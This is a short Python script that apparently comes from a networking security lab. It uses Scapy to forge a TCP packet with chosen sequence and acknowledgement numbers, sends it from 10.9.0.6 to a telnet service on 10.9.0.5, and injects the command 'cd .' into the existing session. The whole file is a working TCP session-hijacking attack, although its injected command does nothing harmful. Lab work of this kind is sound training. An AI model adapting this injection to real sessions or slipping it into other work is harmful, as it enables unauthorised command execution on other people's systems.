#!/usr/bin/env python3
from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=59956, dport=23, flags="AP", seq=1724373313, ack=3460737540)
data = "cd .\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)